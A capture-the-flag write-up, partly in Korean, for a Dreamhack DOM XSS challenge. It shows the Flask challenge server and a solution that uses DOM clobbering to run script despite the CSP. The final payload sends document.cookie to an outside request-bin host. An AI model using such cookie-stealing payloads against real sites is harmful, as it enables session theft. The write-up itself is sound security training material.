## DOM XSS
<hr style="border-top: 1px solid;"><br>

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)
nonce = os.urandom(16).hex()

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, name, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}#{name}"
    return read_url(url, cookie)

@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}' 'strict-dynamic'"
    nonce = os.urandom(16).hex()
    return response

@app.route("/")
def index():
    return render_template("index.html", nonce=nonce)


@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return render_template("vuln.html", nonce=nonce, param=param)


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html", nonce=nonce)
    elif request.method == "POST":
        param = request.form.get("param")
        name = request.form.get("name")
        if not check_xss(param, name, {"name": "flag", "value": FLAG.strip()}):
            return f'<script nonce={nonce}>alert("wrong??");history.go(-1);</script>'

        return f'<script nonce={nonce}>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text, nonce=nonce)


app.run(host="0.0.0.0", port=8000)
```

<br>

vuln.html

![vuln.html](https://user-images.githubusercontent.com/52172169/166129011-cea81770-a310-4945-af00-3ebbe89516eb.png)

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

DOM Clobbering을 이용해서 푸는 문제이다.
: <a href="https://learn.dreamhack.io/326#5" target="_blank">Exploit Tech: Document Object Model Vulnerability</a>

<br>

```javascript
<script nonce={{ nonce }}>
    window.addEventListener("load", function() {
      var name_elem = document.getElementById("name");
      name_elem.innerHTML = `${location.hash.slice(1)} is my name !`;
    });
</script>
```

<br>

위와 같은 코드가 있는데, 보면 ```name_elem.innerHTML```으로 코드를 삽입해준다. 

```name_elem``` 변수는 ```document.getElementById("name");```를 통해 id가 name인 태그를 가리키도록 한다. 

즉, id가 name이고 속성 중에 값으로 innerHTML을 갖는 태그가 있으면 거기로 접근하게 될 것이다.

<br>

HTML id, name, class 속성 차이점
: <a href="https://penguingoon.tistory.com/116" target="_blank">penguingoon.tistory.com/116</a>

<br>

따라서 아래와 같은 코드를 넣어주면 된다.
: ```<script id="name" name="innerHTML"></script>#alert();//```

<br>

alert가 실행된다. 최종 코드는 아래와 같다.
: ```<script id='name' name='innerHTML'></script>#location.href='https://bxzhrfy.request.dreamhack.games?cookie='+document.cookie;//```

<br><br>
<hr style="border: 2px solid;">
<br><br>
